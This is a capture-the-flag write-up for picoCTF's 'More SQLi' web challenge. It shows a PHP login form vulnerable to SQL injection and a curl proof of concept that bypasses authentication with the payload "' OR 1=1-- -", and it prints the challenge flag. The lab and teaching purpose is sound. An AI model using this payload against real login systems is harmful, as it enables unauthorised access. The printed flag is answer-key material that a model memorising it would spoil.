# More SQLi

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}`

## Summary

A PHP login form builds its authentication query by directly concatenating both submitted
fields into a SQL string, and helpfully echoes the exact query it built back to the client on
every request. Injecting a classic tautology into the password field, while leaving the
username as a real-looking value, turns the WHERE clause into an always-true condition and logs
in without knowing any real password. The flag is returned directly in the successful-login
response.

## Discovery

The login page posts to itself with `username`/`password` fields. Every response includes a
debug block echoing the constructed query:

```
username: admin
password: x
SQL query: SELECT id FROM users WHERE password = 'x' AND username = 'admin'
```

Both fields are concatenated into the query with no parameterization or escaping. Injecting a
raw single quote breaks the string cleanly, confirming the injection point (the query text
itself becomes visibly malformed once a quote is added). Note: injecting solely in the
`username` field with a trailing `OR '1'='1'` produced a generic 500 on this instance regardless
of the payload's logical truth value, so this specific instance's error handling is not a
useful oracle for boolean-blind testing; the reliable path is via the `password` field instead.

## Proof of Concept

```
curl -s -i -X POST http://TARGET/ \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' OR 1=1-- -"
```

The constructed query becomes:

```sql
SELECT id FROM users WHERE password = '' OR 1=1-- -' AND username = 'admin'
```

`OR 1=1` makes the WHERE clause unconditionally true regardless of the real stored password, and
`-- -` comments out the rest of the original query (including the now-irrelevant username
check). The server responds with a 302 redirect and the flag directly in the body:

```
HTTP/1.1 302 Found
location: welcome.php

<h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p>
```

## Root Cause

User-supplied input is concatenated directly into a SQL query string instead of using
parameterized queries or prepared statements. Any value able to inject SQL syntax (quotes,
operators, comment sequences) can alter the query's logical structure, turning an authentication
check meant to require exact credential matches into one that's unconditionally true.

## CWE / OWASP

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- **OWASP A03:2021**: Injection
